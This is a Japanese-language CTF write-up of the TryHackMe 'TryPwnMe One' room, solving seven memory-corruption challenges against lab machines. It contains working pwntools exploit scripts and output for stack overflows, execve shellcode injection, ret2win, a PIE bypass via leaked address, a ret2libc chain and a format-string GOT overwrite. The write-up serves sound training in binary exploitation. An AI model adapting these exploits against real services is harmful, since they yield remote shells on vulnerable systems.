# TryPwnMe One CTF

https://tryhackme.com/room/trypwnmeone

## TryOverflowMe 1

```c
int main(){
    setup();
    banner();
    int admin = 0;
    char buf[0x10];

    puts("PLease go ahead and leave a comment :");
    gets(buf);

    if (admin){
        const char* filename = "flag.txt";
        FILE* file = fopen(filename, "r");
        char ch;
        while ((ch = fgetc(file)) != EOF) {
            putchar(ch);
    }
    fclose(file);
    }

    else{
        puts("Bye bye\n");
        exit(1);
    }
}
```

- ローカル変数として、int型4バイト＋配列16バイトのスタック。
- int型が0でなくなればadminとして判定されるので、20バイト分の文字列を与えればクリアできるはず。

```shell
$ nc 10.10.138.120 9003        
                  ___           ___       
      ___        /__/\         /__/\                                                                                                                                                                                                       
     /  /\       \  \:\       |  |::\                                                                                                                                                                                                      
    /  /:/        \__\:\      |  |:|:\                                                                                                                                                                                                     
   /  /:/     ___ /  /::\   __|__|:|\:\                                                                                                                                                                                                    
  /  /::\    /__/\  /:/\:\ /__/::::| \:\                                                                                                                                                                                                   
 /__/:/\:\   \  \:\/:/__\/ \  \:\~~\__\/                                                                                                                                                                                                   
 \__\/  \:\   \  \::/       \  \:\                                                                                                                                                                                                         
      \  \:\   \  \:\        \  \:\                                                                                                                                                                                                        
       \__\/    \  \:\        \  \:\                                                                                                                                                                                                       
                 \__\/         \__\/                                                                                                                                                                                                       
                                                                                                                                                                                                                                           
Please go ahead and leave a comment :                                                                                                                                                                                                      
12345678901234567890
Bye bye
```

予想に反してうまくいかなかった。ghidraでバイナリを調べる。

```c
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined main()
             undefined         <UNASSIGNED>   <RETURN>
             undefined4        Stack[-0xc]:4  local_c                                 XREF[2]:     004008f6(W), 
                                                                                                   0040091a(R)  
             undefined8        Stack[-0x18]:8 local_18                                XREF[2]:     00400927(W), 
                                                                                                   0040092b(R)  
             undefined8        Stack[-0x20]:8 local_20                                XREF[3]:     0040093e(W), 
                                                                                                   0040094f(R), 
                                                                                                   00400964(R)  
             undefined1        Stack[-0x21]:1 local_21                                XREF[3]:     00400944(R), 
                                                                                                   0040095b(W), 
                                                                                                   0040095e(R)  
             undefined1        Stack[-0x38]:1 local_38                                XREF[1]:     00400909(*)  
                             main                                            XREF[4]:     Entry Point(*), 
                                                                                          _start:004006dd(*), 00400cb0, 
                                                                                          00400d90(*)  
        004008da 55              PUSH       RBP
```

実際には、配列とadmin変数の間には、38-C=2Cバイト（44バイト）だけ離れていた。  
45バイト目を0以外にすればよい。

```shell
$ nc 10.10.138.120 9003
                  ___           ___       
      ___        /__/\         /__/\                                                                                                                                                                                                       
     /  /\       \  \:\       |  |::\                                                                                                                                                                                                      
    /  /:/        \__\:\      |  |:|:\                                                                                                                                                                                                     
   /  /:/     ___ /  /::\   __|__|:|\:\                                                                                                                                                                                                    
  /  /::\    /__/\  /:/\:\ /__/::::| \:\                                                                                                                                                                                                   
 /__/:/\:\   \  \:\/:/__\/ \  \:\~~\__\/                                                                                                                                                                                                   
 \__\/  \:\   \  \::/       \  \:\                                                                                                                                                                                                         
      \  \:\   \  \:\        \  \:\                                                                                                                                                                                                        
       \__\/    \  \:\        \  \:\                                                                                                                                                                                                       
                 \__\/         \__\/                                                                                                                                                                                                       
                                                                                                                                                                                                                                           
Please go ahead and leave a comment :                                                                                                                                                                                                      
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaa1
THM{ひみつ}
```

## TryOverflowMe 2

```c
int read_flag(){
        const char* filename = "flag.txt";
        FILE* file = fopen(filename, "r");
        if(!file){
            puts("the file flag.txt is not in the current directory, please contact support\n");
            exit(1);
        }
        char ch;
        while ((ch = fgetc(file)) != EOF) {
        putchar(ch);
    }
    fclose(file);
}

int main(){
    
    setup();
    banner();
    int admin = 0;
    int guess = 1;
    int check = 0;
    char buf[64];

    puts("Please Go ahead and leave a comment :");
    gets(buf);

    if (admin==0x59595959){
            read_flag();
    }

    else{
        puts("Bye bye\n");
        exit(1);
    }
}
```

- 0x59 はASCIIで Y
- guessとcheckは使われていないので、100バイトほどYで埋め尽くせば良いと思われる。

```shell
$ nc 10.10.138.120 9004
                  ___           ___       
      ___        /__/\         /__/\                                                                                                                                                                                                       
     /  /\       \  \:\       |  |::\                                                                                                                                                                                                      
    /  /:/        \__\:\      |  |:|:\                                                                                                                                                                                                     
   /  /:/     ___ /  /::\   __|__|:|\:\                                                                                                                                                                                                    
  /  /::\    /__/\  /:/\:\ /__/::::| \:\                                                                                                                                                                                                   
 /__/:/\:\   \  \:\/:/__\/ \  \:\~~\__\/                                                                                                                                                                                                   
 \__\/  \:\   \  \::/       \  \:\                                                                                                                                                                                                         
      \  \:\   \  \:\        \  \:\                                                                                                                                                                                                        
       \__\/    \  \:\        \  \:\                                                                                                                                                                                                       
                 \__\/         \__\/                                                                                                                                                                                                       
                                                                                                                                                                                                                                           
Please go ahead and leave a comment :                                                                                                                                                                                                      
YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY
THM{ひみつ}
```

## TryExecMe

```c
int main(){
    setup();
    banner();
    char *buf[128];   

    puts("\nGive me your shell, and I will execute it: ");
    read(0,buf,sizeof(buf));
    puts("\nExecuting Spell...\n");

    ( ( void (*) () ) buf) ();

}
```

- pwn を使って、bufにそのままシェルコードを入れればよい

i386.linux.execve で失敗したが、amd64.linux.execve にすることで成功した。

```shell
$ pwn shellcraft amd64.linux.execve "/bin///sh" "['sh', '-p']" -f s
"jhH\xb8\x2fbin\x2f\x2f\x2fsPH\x89\xe7H\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8ri\x01,q\x01\x01\x01H1\x04\x241\xf6Vj\x0b^H\x01\xe6Vj\x10^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05"
```

```python
from pwn import *

host = "10.10.138.120"
port = 9005
connect = remote(host, port)
connect.recvuntil(b"Give me your shell, and I will execute it: ")

shellcode = b"jhH\xb8\x2fbin\x2f\x2f\x2fsPH\x89\xe7H\xb8\x01\x01\x01\x01\x01\x01\x01\x01PH\xb8ri\x01,q\x01\x01\x01H1\x04\x241\xf6Vj\x0b^H\x01\xe6Vj\x10^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05"
connect.sendline(shellcode)
connect.interactive()
```

```shell
$ python ./task5amd.py                                             
[+] Opening connection to 10.10.138.120 on port 9005: Done
[*] Switching to interactive mode


Executing Spell...

$ ls -al
total 28
drwxr-xr-x 1 nobody nogroup  4096 Aug 28  2024 .
drwxr-xr-x 1 nobody nogroup  4096 Aug 28  2024 ..
-rw-rw-r-- 1 nobody nogroup    40 Jun 14  2024 flag.txt
-rwxrwxr-x 1 nobody nogroup 16192 Aug 27  2024 run
$ cat flag.txt
THM{ひみつ}
```

## TryRetMe

```c
int win(){
    system("/bin/sh");
}

void vuln(){
    char *buf[0x20];
    puts("Return to where? : ");
    read(0, buf, 0x200);
    puts("\nok, let's go!\n");
}

int main(){
    setup();
    vuln();
}
```

- read 呼び出しでmaxlenの桁が間違っている
- vulnからmainへのretアドレスを、win関数のアドレスに上書きすればよい
- 配列32バイト+RBP8バイト=40バイトの位置をwin関数のアドレスで上書きすれば良いはず
- ghidra調べで、win関数のアドレスは `0x004011dd`

以上の情報で実行したが失敗した。バイナリを解析すると、配列のサイズが256バイトになっていた。

```python
#!/usr/bin/env pyhon3
from pwn import *
import sys

host = "10.10.138.120"
port = 9006

context(os = "linux", arch = "amd64")
connect = remote(host, port)
log.info("[+] Starting buffer Overflow")
connect.recvuntil(b"Return to where? : ")
log.info("[+] Crafting payload")
payload = b'A' * (256+8)
payload += p64(0x004011dd)
log.info("[+] Sending Payload to the remote server")
connect.sendline(payload)
connect.interactive()
```

これも成功しなかった。

```
 RSP  0x7fffffffdcf8 ◂— 0x6361617263616171 ('qaacraac')
```

末尾が0でなく、RSPが16バイト境界にないため、retガジェットが必要。

retガジェットのアドレスを特定

```
>>> from pwn import *
>>> binary = context.binary = ELF("./tryretme")
[*] '/home/kali/CTF/0426/materials-TryPwnMeOne/TryRetMe/tryretme'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
>>> ret_gadget = ROP(binary).find_gadget(['ret'])[0]
[*] Loading gadgets for '/home/kali/CTF/0426/materials-TryPwnMeOne/TryRetMe/tryretme'
>>> hex(ret_gadget)
'0x40101a'
```

retガジェットを挟む

```python
#!/usr/bin/env pyhon3
from pwn import *
import sys

host = "10.10.138.120"
port = 9006

context(os = "linux", arch = "amd64")
connect = remote(host, port)
log.info("[+] Starting buffer Overflow")
connect.recvuntil(b"Return to where? : ")
log.info("[+] Crafting payload")
payload = b'A' * (256+8)
payload += p64(0x0040101a) # retガジェット
payload += p64(0x004011dd)
log.info("[+] Sending Payload to the remote server")
connect.sendline(payload)
connect.interactive()
```

実行

```shell
$ python tryret.py  
[+] Opening connection to 10.10.138.120 on port 9006: Done
[*] [+] Starting buffer Overflow
[*] [+] Crafting payload
[*] [+] Sending Payload to the remote server
[*] Switching to interactive mode


ok, let's go!

$ ls
flag.txt
run
$ cat flag.txt
THM{ひみつ}
```

## Random Memories

```c
int win(){
    system("/bin/sh\0");
}

void vuln(){
    char *buf[0x20];
    printf("I can give you a secret %llx\n", &vuln);
    puts("Where are we going? : ");
    read(0, buf, 0x200);
    puts("\nok, let's go!\n");
}

int main(){
    setup();
    banner();
    vuln();
}
```

checksec

```
pwndbg> checksec
File:     /home/kali/CTF/0426/materials-TryPwnMeOne/RandomMemories/random
Arch:     amd64
RELRO:      Full RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        PIE enabled
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

- PIE enabledのため、はメモリ配置がランダムになっている。
- 実行時にvuln関数のアドレスが表示されるのでオフセットが分かるはず。

vuln関数とwin関数の相対アドレスを取得
```
pwndbg> info address vuln
Symbol "vuln" is at 0x1319 in a file compiled without debugging.
pwndbg> info address win
Symbol "win" is at 0x1210 in a file compiled without debugging.
```

retガジェットの相対アドレスを取得
```shell
$ python          
Python 3.13.2 (main, Mar 13 2025, 14:29:07) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> binary = context.binary = ELF("./random")
[*] '/home/kali/CTF/0426/materials-TryPwnMeOne/RandomMemories/random'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
>>> ret_gadget = ROP(binary).find_gadget(['ret'])[0]
/usr/lib/python3/dist-packages/ropgadget/gadgets.py:277: SyntaxWarning: invalid escape sequence '\?'
  [b"\xd6\?[\x00-\x03]{1}[\x00\x20\x40\x60\x80\xa0\xc0\xe0]{1}", 4, 4]  # blr reg # noqa: W605 # FIXME: \?
/usr/lib/python3/dist-packages/ropgadget/gadgets.py:282: SyntaxWarning: invalid escape sequence '\?'
  [b"[\x00\x20\x40\x60\x80\xa0\xc0\xe0]{1}[\x00-\x03]{1}\?\xd6", 4, 4]  # blr reg # noqa: W605 # FIXME: \?
/usr/lib/python3/dist-packages/ropgadget/ropchain/arch/ropmakerx64.py:29: SyntaxWarning: invalid escape sequence '\['
  regex = re.search("mov .* ptr \[(?P<dst>([(rax)|(rbx)|(rcx)|(rdx)|(rsi)|(rdi)|(r9)|(r10)|(r11)|(r12)|(r13)|(r14)|(r15)]{3}))\], (?P<src>([(rax)|(rbx)|(rcx)|(rdx)|(rsi)|(rdi)|(r9)|(r10)|(r11)|(r12)|(r13)|(r14)|(r15)]{3}))$", f)
/usr/lib/python3/dist-packages/ropgadget/ropchain/arch/ropmakerx86.py:29: SyntaxWarning: invalid escape sequence '\['
  regex = re.search("mov dword ptr \[(?P<dst>([(eax)|(ebx)|(ecx)|(edx)|(esi)|(edi)]{3}))\], (?P<src>([(eax)|(ebx)|(ecx)|(edx)|(esi)|(edi)]{3}))$", f)
[*] Loading gadgets for '/home/kali/CTF/0426/materials-TryPwnMeOne/RandomMemories/random'
>>> hex(ret_gadget)
'0x101a'
```

vuln関数の絶対アドレスを受信したらオフセットを計算できる。

```python
#!/usr/bin/env pyhon3
from pwn import *
import sys

host = "10.10.61.104"
port = 9007

vuln_addr = 0x1319
win_addr = 0x1210
ret_gadget = 0x101a

context(os = "linux", arch = "amd64")
connect = remote(host, port)

# vuln関数アドレスを表示する行を受信するまで待つ
while True:
    line = connect.recvline().decode()
    log.info(f"{line.strip()}")
    if "I can give you a secret" in line:
        break

# アドレス部分（16進数）を抽出
match = re.search(r"I can give you a secret ([0-9a-fA-F]+)", line)
if match:
    vuln_abs_addr = int(match.group(1), 16)
    log.info(f"[+] vuln address: {hex(vuln_abs_addr)}")
    offset = vuln_abs_addr - vuln_addr
else:
    log.error("vulnアドレスの抽出に失敗しました")
    sys.exit(1)

log.info("[+] Starting buffer Overflow")
connect.recvuntil(b"Where are we going? : ")
log.info("[+] Crafting payload")
payload = b'A' * (256+8)

payload += p64(offset + ret_gadget) # retガジェット
payload += p64(offset + win_addr)
log.info("[+] Sending Payload to the remote server")
connect.sendline(payload)
connect.interactive()
```

実行

```shell
$ python ./task7.py
[+] Opening connection to 10.10.61.104 on port 9007: Done
[*]              ___     ___     ___     ___
[*] /    \  /    \  /    \  /    \                                                                                  
[*] |  CODE|  |  STACK|  |  HEAP|  |  LIBS|
[*] \_____/  \_____/  \_____/  \_____/
[*] ^       ^       ^       ^
[*] |       |       |       |
[*] 
[*] 
[*] Powered by THMlabs
[*] Unpredictable locations
[*] 
[*] 
[*] 
[*] I can give you a secret 563719267319
[*] [+] vuln address: 0x563719267319
[*] [+] Starting buffer Overflow
[*] [+] Crafting payload
[*] [+] Sending Payload to the remote server
[*] Switching to interactive mode


ok, let's go!

$ ls
flag.txt
run
$ cat flag.txt
THM{ひみつ}
```

## The Librarian

```c
void vuln(){
    char *buf[0x20];
    puts("Again? Where this time? : ");
    read(0, buf, 0x200);
    puts("\nok, let's go!\n");
    }

int main(){
    setup();
    vuln();

}
```

soファイルが添付されている。

```shell
$ ls
ld-linux-x86-64.so.2  libc.so.6  thelibrarian

$ ldd ./thelibrarian
        linux-vdso.so.1 (0x00007ffd07cbe000)
        libc.so.6 => ./libc.so.6 (0x00007f11c4200000)
        ld-linux-x86-64.so.2 => /lib64/ld-linux-x86-64.so.2 (0x00007f11c47f6000)

$ ldd ./thelibrarian
        linux-vdso.so.1 (0x00007ffe7bfbd000)
        libc.so.6 => ./libc.so.6 (0x00007fa981600000)
        ld-linux-x86-64.so.2 => /lib64/ld-linux-x86-64.so.2 (0x00007fa981d46000)
```

ライブラリのアドレスが変わることから、OSでASLRが有効になっていることが分かる。

```shell
$ pwn checksec ./thelibrarian 
[*] '/home/kali/CTF/0426/materials-TryPwnMeOne/TheLibrarian/thelibrarian'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    RUNPATH:    b'.'
    Stripped:   No
```

PIE無効なので、プログラム本体のアドレスは不変。

https://0xb0b.gitbook.io/writeups/tryhackme/2024/trypwnme-one から拝借

- puts関数呼び出しで、puts関数のアドレスを出力
- main関数に戻す（プロセス終了によりアドレス配置を変えないため）
- 8バイト受信（puts関数で出力したアドレスを取得）
- putsアドレスからベースアドレスを計算
- ベースアドレスを使用して、"/bin/sh"文字列とsystem関数アドレスを計算
- "/bin/sh"文字列を引数としてsystem関数呼び出し

```python
from pwn import * 
binary_file = './thelibrarian'
libc = ELF('./libc.so.6')

# Connect to remote target
p = remote('10.10.65.211', 9008)
#p = process(binary_file)

context.binary = binary = ELF(binary_file, checksec=False)
rop = ROP(binary)

padding = b"A" * 264
payload = padding
payload += p64(rop.find_gadget(['ret'])[0])
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(binary.got.puts)
payload += p64(binary.plt.puts)
payload += p64(binary.symbols.main)

p.recvuntil(b"Again? Where this time? : \n")
p.sendline(payload)
p.recvuntil(b"ok, let's go!\n\n")
leak = u64(p.recvline().strip().ljust(8, b'\0'))
log.info(f'Puts leak => {hex(leak)}')

# Calculate libc base
libc.address = leak - libc.symbols.puts
log.info(f'Libc base => {hex(libc.address)}')

# Calculate the /bin/sh and system addresses using the provided offsets
bin_sh_offset = 0x1b3d88
system_offset = 0x4f420

bin_sh = libc.address + bin_sh_offset
system = libc.address + system_offset

log.info(f'/bin/sh address => {hex(bin_sh)}')
log.info(f'system address => {hex(system)}')

# Second payload for spawning shell
payload = padding
payload += p64(rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(bin_sh)            # Use manually calculated /bin/sh address
payload += p64(system)            # Use manually calculated system address
payload += p64(rop.find_gadget(['ret'])[0])
payload += p64(0x0) 

p.recvuntil(b"Again? Where this time? : \n")
p.sendline(payload)
p.recvuntil(b"ok, let's go!\n\n")
p.interactive()
```

## Not Specified

```c
int win(){
    system("/bin/sh\0");
}

int main(){

    setup();
    banner();
    char *username[32];
    puts("Please provide your username\n");
    read(0,username,sizeof(username));
    puts("Thanks! ");
    printf(username);
    puts("\nbye\n");
    exit(1);    
}
```

```shell
$ pwn checksec ./notspecified 
[*] '/home/kali/CTF/0426/materials-TryPwnMeOne/NotSpecified/notspecified'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

printfのフォーマット文字列を使える。

https://0xb0b.gitbook.io/writeups/tryhackme/2024/trypwnme-one

```python
python -c "print('ABCDEFGH|' + '|'.join(['%d:%%p' % i for i in range(1,40)]))" | ./notspecified | grep 4847
```

```python
from pwnlib.fmtstr import FmtStr, fmtstr_split, fmtstr_payload
from pwn import *
context.clear(arch = 'amd64', endian ='little')
def send_payload(payload):
        s.recvline()
        s.sendline(payload)
        r = s.recvline()
        return r

elf = ELF('./notspecified')
exit_got = elf.got['exit']
win_func = elf.symbols['win']
#s = process('./notspecified')
s = remote('10.10.65.211', 9009)

payload = fmtstr_payload(6, {exit_got: win_func})
print(payload)
print(send_payload(payload))
s.interactive()
```
